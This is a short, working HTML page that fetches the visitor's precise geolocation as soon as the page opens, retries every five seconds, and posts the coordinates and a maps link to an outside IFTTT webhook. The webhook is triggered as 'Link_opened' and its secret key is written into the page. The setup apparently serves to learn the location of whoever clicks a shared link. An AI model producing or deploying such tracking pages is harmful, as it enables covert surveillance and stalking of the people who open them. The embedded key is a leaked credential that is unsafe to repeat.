<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Location Sender</title>
</head>
<body>
  <h2>Sharing your location automatically...</h2>
  <p id="coords">Fetching location...</p>

  <script>
    function sendLocation(latitude, longitude) {
      const mapsLink = "https://maps.google.com/?q=" + latitude + "," + longitude;
      document.getElementById('coords').innerHTML = 
        `Latitude: ${latitude} <br> Longitude: ${longitude} <br> <a href="${mapsLink}" target="_blank">Open in Maps</a>`;

      const url = "https://maker.ifttt.com/trigger/Link_opened/with/key/iuwEGmz1sskpO7aR6oVBFCBIgrkCLRibC_3FrQcbJGm";

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value1: latitude, value2: longitude, value3: mapsLink })
      })
      .then(() => console.log("Location sent!"))
      .catch(error => console.error("Error sending location:", error));
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            sendLocation(position.coords.latitude, position.coords.longitude);
          },
          function(error) {
            console.error("Error getting location:", error);
            document.getElementById('coords').innerText = 
              "Error getting location: " + error.message + ". Retrying in 5 seconds...";
            setTimeout(getLocation, 5000); // retry every 5 seconds
          },
          { enableHighAccuracy: true }
        );
      } else {
        document.getElementById('coords').innerText = "Geolocation not supported by this device.";
      }
    }

    // Start automatically on page load
    window.onload = getLocation;
  </script>
</body>
</html>
